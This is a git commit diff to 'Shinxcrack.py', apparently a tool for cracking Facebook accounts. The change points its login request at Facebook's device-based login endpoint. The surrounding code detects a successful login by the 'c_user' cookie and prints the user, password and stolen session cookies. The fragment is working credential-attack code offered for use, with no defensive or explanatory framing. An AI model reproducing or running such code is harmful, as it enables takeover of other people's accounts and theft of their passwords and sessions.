31ffd9573602c33ce266336e4804394b75d4c063
shinzy12 <91730481+shinzy12@users.noreply.github.com>
2022-02-13 00:47:29 +0700

    Update Shinxcrack.py

--- Shinxcrack.py
+++ Shinxcrack.py
@@ -456,7 +456,7 @@ class ngentod:
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://m.facebook.com/ntdelegatescreen'})
-            po = ses.post('https://m.facebook.com/ntdelegatescreen/?params=%7B%22entry-point%22%3A%22settings%22%7D&path=%2Fcontacts%2Fmanagement%2F', data=data).text
+            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
